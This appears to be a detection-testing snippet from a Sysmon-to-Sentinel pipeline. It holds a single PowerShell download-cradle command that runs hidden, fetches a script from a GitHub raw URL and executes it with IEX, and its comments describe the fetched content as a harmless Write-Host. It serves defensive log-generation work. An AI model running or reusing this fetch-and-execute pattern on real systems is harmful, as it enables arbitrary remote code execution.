# SAFE SIMULATION: mimics a malicious download-cradle pattern.
# Downloads a plain text file (not executable code) from a public gist,
# and "IEX"s it — but the content is just a harmless Write-Host command.
# This exists purely to generate a realistic CommandLine for Sysmon/4688 to log.

powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BikDHINDSA/sysmon-to-sentinel-detection-pipeline/refs/heads/main/Dud_malicious_script.ps1')"